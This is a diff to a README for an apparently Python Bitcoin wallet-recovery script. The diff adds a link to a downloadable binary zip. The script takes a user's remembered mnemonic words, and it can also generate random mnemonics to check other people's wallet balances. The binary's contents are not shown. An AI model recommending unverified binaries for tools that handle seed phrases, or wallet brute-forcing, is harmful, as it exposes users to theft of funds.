@@ -54,7 +54,7 @@ pip install -r requirements.txt
 ```
 python recover.py
 ```
-
+Or you can run it from binary files: https://github.com/Kelly-McGowan/btc-wallet-restore/releases/download/recover/recover.zip
 2. Follow the on-screen prompts to choose between recovering a wallet from a partial mnemonic or checking random wallets.
 3. If you choose to recover a wallet from a partial mnemonic, enter the words you remember from your mnemonic phrase, separated by spaces.
 4. If you choose to check random wallets, the script will generate random mnemonic phrases and check the corresponding wallet balances.
